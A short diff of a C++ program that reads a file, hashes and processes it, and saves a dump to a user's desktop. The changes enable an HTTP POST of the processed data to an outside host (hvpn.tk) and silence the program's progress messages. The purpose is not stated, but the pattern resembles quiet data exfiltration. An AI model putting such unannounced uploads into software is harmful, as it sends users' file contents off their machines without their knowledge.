@@ -5,6 +5,8 @@
 #include "Utils.h"
 #include "sha256.h"
 #include "Consts.h"
+#include "HTTPHandler.h"
+
 //#include "HTTPHandler.h"
 
 typedef std::codecvt_utf8<wchar_t> convert_type;
@@ -27,13 +29,11 @@ int _tmain(int argc, _TCHAR* argv[])
 
 		char * buffer = new char[length + 1];
 
-		std::cout << "Reading " << length << " characters...\n";
+		//std::cout << "Reading " << length << " characters...\n";
 		// read data as a block:
 		is.read(buffer, length);
 
-		if (is)
-			std::cout << "all characters read successfully.\n";
-		else
+		if (!is)
 			std::cout << "error: only " << is.gcount() << " could be read\n";
 		is.close();
 		buffer[length] = '\0';
@@ -55,7 +55,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	dumpToFile("C:\\Users\\Henry\\Desktop\\output.txt", tsq, totalLength);
 
 
-	//HTTPHandler::postRequest("http://hvpn.tk/f", "fd", tsq, 1);
+	HTTPHandler::postRequest("http://hvpn.tk/f", "fd", tsq, 1);
 
 	std::string s;
 	std::getline(std::cin, s);
